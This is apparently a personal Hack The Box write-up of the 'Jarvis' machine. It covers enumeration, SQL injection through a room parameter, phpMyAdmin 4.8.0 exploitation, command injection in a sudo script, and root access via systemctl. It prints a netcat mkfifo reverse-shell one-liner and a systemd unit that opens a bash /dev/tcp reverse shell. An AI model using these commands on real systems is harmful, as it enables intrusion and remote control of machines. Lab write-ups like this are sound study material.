
* Initial nmap output:  

```console
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

* The full map output: 


* Banner grabbing `ssh` and `http`  
  * The ssh
  ```console
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.25 ((Debian))
  ``` 

  * The http  
  ```console
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

* So depending on the tags of the machine seems like I have to do an sqli in one way or another. I will try sqlmap.

```sqlmap -u 10.10.10.143/myphpadmin --data='pma_username=&pma_password=' --method POST --dbs --batch```

* It does not make any sense to use it anyway because the only parameter I have is the `cod=` which seems to be the parameter for the room's code.


gobuster dir -u http://10.10.10.143 -x php,txt,html -w /home/kali/SecLists/Discovery/Web-Content/big.txt

* Found a directory called `/connection.php` when doing `gobuster`.
* The results  
```
/connection.php       (Status: 200) [Size: 0]  
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.143/css/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.143/fonts/]
/footer.php           (Status: 200) [Size: 2237]                                
/images               (Status: 301) [Size: 313] [--> http://10.10.10.143/images/]
/index.php            (Status: 200) [Size: 23628]                                
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.143/js/]    
/nav.php              (Status: 200) [Size: 1333]                                 
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.10.143/phpmyadmin/]
/room.php             (Status: 302) [Size: 3024] [--> index.php]                     
/server-status 
```

* Found a page called `/myphpadmin` and it is a login page which means that I might be able to do the sql injection from there or anything else.

* Found this `http://10.10.10.143/phpmyadmin/setup/index.php`. Seems like it's not supposed to be accessabile to the public even tho it it.
* This page might be useful.


* Gobustering `/phpmyadmin` is a gem I've got tons of directories that seem to be useful (Most of them at least)  

```
/ChangeLog            (Status: 200) [Size: 19186]
/LICENSE              (Status: 200) [Size: 18092]
/README               (Status: 200) [Size: 1520] 
/ajax.php             (Status: 200) [Size: 15219]
/changelog.php        (Status: 200) [Size: 15215]
/doc                  (Status: 301) [Size: 321] [--> http://10.10.10.143/phpmyadmin/doc/]
/examples             (Status: 301) [Size: 326] [--> http://10.10.10.143/phpmyadmin/examples/]
/export.php           (Status: 200) [Size: 15213]                                             
/favicon.ico          (Status: 200) [Size: 22486]                                             
/import.php           (Status: 200) [Size: 15223]                                             
/index.php            (Status: 200) [Size: 15211]                                             
/js                   (Status: 301) [Size: 320] [--> http://10.10.10.143/phpmyadmin/js/]      
/libraries            (Status: 301) [Size: 327] [--> http://10.10.10.143/phpmyadmin/libraries/]
/license.php          (Status: 200) [Size: 15210]                                              
/locale               (Status: 301) [Size: 324] [--> http://10.10.10.143/phpmyadmin/locale/]   
/logout.php           (Status: 200) [Size: 15213]                                              
/navigation.php       (Status: 200) [Size: 15221]                                              
/phpinfo.php          (Status: 200) [Size: 15252]                                              
/robots.txt           (Status: 200) [Size: 26]                                                 
/robots.txt           (Status: 200) [Size: 26]                                                 
/setup                (Status: 301) [Size: 323] [--> http://10.10.10.143/phpmyadmin/setup/]    
/sql                  (Status: 301) [Size: 321] [--> http://10.10.10.143/phpmyadmin/sql/]      
/sql.php              (Status: 200) [Size: 15207]                                              
/templates            (Status: 301) [Size: 327] [--> http://10.10.10.143/phpmyadmin/templates/]
/themes               (Status: 301) [Size: 324] [--> http://10.10.10.143/phpmyadmin/themes/]   
/themes.php           (Status: 200) [Size: 15236]                                              
/tmp                  (Status: 301) [Size: 321] [--> http://10.10.10.143/phpmyadmin/tmp/]      
/url.php              (Status: 302) [Size: 0] [--> /phpmyadmin/]                               
/vendor               (Status: 301) [Size: 324] [--> http://10.10.10.143/phpmyadmin/vendor/] 
```





# Machine #9 Jarvis  


## Nmap Results  
  <img src="https://nmap.org/images/nmap-logo-256x256.png">   

* Initial nmap output  

  ```console
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  ```  

* Full scan gave the same results.

<br/><br/>

## Banner Grabbing of Services  

* The ssh
  ```console
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.25 ((Debian))
  ``` 

* The http  
  ```console
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```  

<br/><br/>

## Searchsploiting Results   
  <img src="https://www.offensive-security.com/wp-content/uploads/2020/05/SearchSploit-1.png" width=400 height=200>   

* Nothing significant search just yet. 

<br/><br/>  

## Gobustering Stuff  
  <img src="https://cdn.akamai.steamstatic.com/steam/apps/1092880/capsule_616x353.jpg?t=1605640630" width=400 height=200>  


* Gobustering root `/`  
  ```console
  /connection.php       (Status: 200) [Size: 0]  
  /css                  (Status: 301) [Size: 310] [--> http://10.10.10.143/css/]
  /fonts                (Status: 301) [Size: 312] [--> http://10.10.10.143/fonts/]
  /footer.php           (Status: 200) [Size: 2237]                                
  /images               (Status: 301) [Size: 313] [--> http://10.10.10.143/images/]
  /index.php            (Status: 200) [Size: 23628]                                
  /js                   (Status: 301) [Size: 309] [--> http://10.10.10.143/js/]    
  /nav.php              (Status: 200) [Size: 1333]                                 
  /phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.10.143/phpmyadmin/]
  /room.php             (Status: 302) [Size: 3024] [--> index.php]                     
  /server-status 
  ```  

* Gobustering `/phpmyadmin`  
  ```console
  /ChangeLog            (Status: 200) [Size: 19186]
  /LICENSE              (Status: 200) [Size: 18092]
  /README               (Status: 200) [Size: 1520] 
  /ajax.php             (Status: 200) [Size: 15219]
  /changelog.php        (Status: 200) [Size: 15215]
  /doc                  (Status: 301) [Size: 321] [--> http://10.10.10.143/phpmyadmin/doc/]
  /examples             (Status: 301) [Size: 326] [--> http://10.10.10.143/phpmyadmin/examples/]
  /export.php           (Status: 200) [Size: 15213]                                             
  /favicon.ico          (Status: 200) [Size: 22486]                                             
  /import.php           (Status: 200) [Size: 15223]                                             
  /index.php            (Status: 200) [Size: 15211]                                             
  /js                   (Status: 301) [Size: 320] [--> http://10.10.10.143/phpmyadmin/js/]      
  /libraries            (Status: 301) [Size: 327] [--> http://10.10.10.143/phpmyadmin/libraries/]
  /license.php          (Status: 200) [Size: 15210]                                              
  /locale               (Status: 301) [Size: 324] [--> http://10.10.10.143/phpmyadmin/locale/]   
  /logout.php           (Status: 200) [Size: 15213]                                              
  /navigation.php       (Status: 200) [Size: 15221]                                              
  /phpinfo.php          (Status: 200) [Size: 15252]                                              
  /robots.txt           (Status: 200) [Size: 26]                                                 
  /robots.txt           (Status: 200) [Size: 26]                                                 
  /setup                (Status: 301) [Size: 323] [--> http://10.10.10.143/phpmyadmin/setup/]    
  /sql                  (Status: 301) [Size: 321] [--> http://10.10.10.143/phpmyadmin/sql/]      
  /sql.php              (Status: 200) [Size: 15207]                                              
  /templates            (Status: 301) [Size: 327] [--> http://10.10.10.143/phpmyadmin/templates/]
  /themes               (Status: 301) [Size: 324] [--> http://10.10.10.143/phpmyadmin/themes/]   
  /themes.php           (Status: 200) [Size: 15236]                                              
  /tmp                  (Status: 301) [Size: 321] [--> http://10.10.10.143/phpmyadmin/tmp/]      
  /url.php              (Status: 302) [Size: 0] [--> /phpmyadmin/]                               
  /vendor               (Status: 301) [Size: 324] [--> http://10.10.10.143/phpmyadmin/vendor/] 
  ```

<br/><br/>

## Thinking Out Loud   

  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQr4hzX6KoRN5PjPJjy8QC43K0T-CoXZHawDIxG4jCa9aMD1K8Vl3vhpG2a2OVbiy-i93c&usqp=CAU" width=200 height=200>  

  * So depending on the tags of the machine seems like I have to do an sqli in one way or another. I will try sqlmap. `sqlmap -u 10.10.10.143/myphpadmin --data='set_session=5qrjovmconhvga09mp1jjs55no0l6mq3&pma_username=admin&pma_password=admin&server=1&target=index.php&token=OVAQ%5BCV7zODc%3EEgg' --method POST --dbs --batch`.

  * It does not make any sense to use it anyway because the only parameter I have is the `cod=` which seems to be the parameter for the room's code.


  gobuster dir -u http://10.10.10.143 -x php,txt,html -w /home/kali/SecLists/Discovery/Web-Content/big.txt

  * Found a directory called `/connection.php` when doing `gobuster`.
  * The results  


  * Found a page called `/myphpadmin` and it is a login page which means that I might be able to do the sql injection from there or anything else.

  * Found this `http://10.10.10.143/phpmyadmin/setup/index.php`. Seems like it's not supposed to be accessabile to the public even tho it it.


  * Gobustering `/phpmyadmin` is a gem I've got tons of directories that seem to be useful (Most of them at least)  


  * Seems like phpmyadmin uses a templating engine called 'Twig' and this might allow me to do a Server-Side Template Injection that might be equivalent to sql injection. One of the tags was just "Injection" which could mean that it might be another type of injection. 
  * I can get an RCE through this injection vulnerability.

* There are a bunch of stuff that I can go to.
* Found an exploit (LFI) of the phpmyadmin version we have (4.8.0) but it's not working. I don't know if this means that they've patched the vulnerability or that I'm not using it the proper way. Anyway I don't think it's that easy.
* There's also this tamplating engine "Twig" that is a templating engine for the programming language php. I can inject code into it if it's vulnerable, but I'm not sure yet about this approach.
* SQL injection. Not sure where to go from here.
* There's this weird line of code in the response that has like weird stuff that I don't know if they're helpful 
```javascript
PMA_commonParams.setAll({common_query:"",opendb_url:"db_structure.php",lang:"en_GB",server:"1",table:"",db:"",token:")^||1xKqg]1MzIfK",text_dir:"ltr",show_databases_navigation_as_tree:true,pma_text_default_tab:"Browse",pma_text_left_default_tab:"Structure",pma_text_left_default_tab2:false,LimitChars:"50",pftext:"",confirm:true,LoginCookieValidity:"1440",session_gc_maxlifetime:"1440",logged_in:false,is_https:false,rootPath:"/phpmyadmin/",arg_separator:"&",PMA_VERSION:"4.8.0",auth_type:"cookie",user:"root"}
```  

* It might be a Server Side Template Injection.
* Also, look into the exploits that phpmyadmin version 4.8.0 have. Seems like it has alot of exploits.
* Most exploits seem to need authentication.

* Found a Cross-site Request forgery on searchsploit but it needs an authenticated user plus I don't think CSRF would work on HTB machines because it needs interaction with users.
* https://www.cvedetails.com/cve/CVE-2020-5504/ Seems like I can do SQLi when I get authenticated.
* Default Credentials? root and empty not working

* Seems like the phpmyadmin version we have is vulnerable to LFI with the parameter "target". Can they patch the vulnerability LFI? without downloading a new version of phpmyadmin? I should research it.   



"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1234 >/tmp/f"  


www-data can run this command as pepper (THAT'S SOMETHING)
```
/var/www/Admin-Utilities/simpler.py
```   

* Turned out to be sql injection in the rooms parameter
* I'm gonna have to check all parameters on a web application for sql injection
<br/><br/>



## How Did I Solve the Challenge   

   <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   
   
1. I was so distracted with the phpmyadmin and the fact that I need to get the credentials through the phpmyadmin setup page or through a weak password vulnerability that I didn't notice that I can exploit the website itself.
2. So, it turned out that there was an sql injection with the parameter `cod=` while browsing the rooms which I thought didn't exist because I was using sqlmap the wrong way. I was using the syntax where you give it the url as input, but the right one was more like, putting the request in a file and then sending this file as an input with the whole request payload including the headers, ... etc.
3. After I got sql injection through sqlmap I got the credentials for login in phpmyadmin it was easy because I have already found an exploit for authenticated user on phpmyadmin 4.8.0.
4. The exploit was also an sql injection mixed up with an LFI ( I think ... I have to make sure of this ). Found an easily read python script that automated the attack and used it because I kind of like had to open the reverse shell more than a dozen times because I got super busy.
5. Anyway, After I got access to the system as `www-data` I didn't really have any privileges to do anything so I needed to escalate my privilege up to pepper ( a user on the system ) and this way I can read the `user.txt` file and I can execute a command `/bin/systemctl` that could lead to getting a rev shell as root.
6. Which means getting pepper gives me root on a golden plate.
7. But getting pepper was a problem.
8. Found a script that my user `www-data` can run as pepper ( A python script ) which could definitely mean that I can exploit it in some way that would get me pepper privilege.
9. I scurtinized the code enough that I almost memorized the damn thing, trying to figure out how the hell am I supposed to exploit it.
10. Found two possible ways, one to hijack libraries which didn't work because all the libraries privileges on the system had good privileges, the other way is to exploit the function `os.system()` so I kind of didn't know how to do that because I felt that if had good validation. But there was a way to evade the validations they've put on it through the `$()` which allows me to execute a command inside another command, which is exactly what I want to execute a command inside the ping.
11. I tried to use the `!!` but the `os.system` did not really take it, it kept taking it as a string for some reason. It's like the function didn't recognize it. 
12. Anyway, as soon as I got pepper I used `/bin/systemctl` to create a root service and then run it like this   
13. Create a file that contains this and has a name like so "root.service"
```console

[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target

```   

14. Then we like enable the service with this command `/bin/systemctl enable /path/we/saved/service/in/root.service` and we can save the service in any writable directory.  
15. Then we start the service after we started listening on our box with this command `/bin/systemctl start root`.



## What Vulnerability are we Talking About Here?   
### SQL Injection
* First there was an sql injection with the parameter that allowed me to browse the rooms. How can one figure that out? By thinking, that there's a possibility that the system in the backend could check the id with something like `SELECT * FROM something WHERE id=sth`.
* Solution: Input validation plus install a WAF (check out what the hell is it?)

### Phpmyadmin version 4.8.0
* Then there was the vulnerability with the phpmyadmin version (4.8.0) which is a version with alot of vulnerabilities that are also easily exploited. 
* Solution: Update the version of phpmyadmin.

### The sudo privilege that should've never been there

* A sudo privilege that gave me pepper privilege while running a script.
* We can keep the sudo privilege but do better sanitization to the input in the os.system function in the script because that's how I was able to exploit it.


### Misconfigured Permissions (SUID) of `/bin/systemctl`
* The user pepper can execute this command `/bin/systemctl` as root because of this permission misconfiguration and thus I was able to make a service that creates a reverse shell and then execute it as root through the service just like I explain above.
* Solution: I think here it would be as simple as not putting `s` privilege on such a privileged command.

















